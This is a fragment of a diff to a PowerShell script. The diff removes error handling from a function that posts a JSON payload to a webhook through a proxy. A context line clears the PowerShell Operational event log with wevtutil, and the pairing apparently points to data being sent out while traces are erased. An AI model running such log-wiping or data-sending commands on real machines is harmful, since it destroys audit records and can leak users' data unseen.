@@ -36,24 +36,12 @@ function Send-Webhook-Data {
 
     $body = $Payload | ConvertTo-Json -Depth 5
 
-    try {
-        $response = Invoke-RestMethod `
-            -Uri $webhookUrl `
-            -Method Post `
-            -Body $body `
-            -ContentType "application/json; charset=utf-8" `
-            -Proxy $proxy
-    } 
-    catch [System.Net.WebException] {
-        $stream = $_.Exception.Response.GetResponseStream()
-        $reader = New-Object System.IO.StreamReader($stream)
-        $responseBody = $reader.ReadToEnd()
-        
-        Write-Error "HTTP Error $($_.Exception.Response.StatusCode): $responseBody"
-    }
-    catch {
-        Write-Error "Ошибка: $($_.Exception.Message)"
-    }    
+    Invoke-RestMethod `
+        -Uri $webhookUrl `
+        -Method Post `
+        -Body $body `
+        -ContentType "application/json; charset=utf-8" `
+        -Proxy $proxy
 }
 
 
@@ -581,6 +569,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
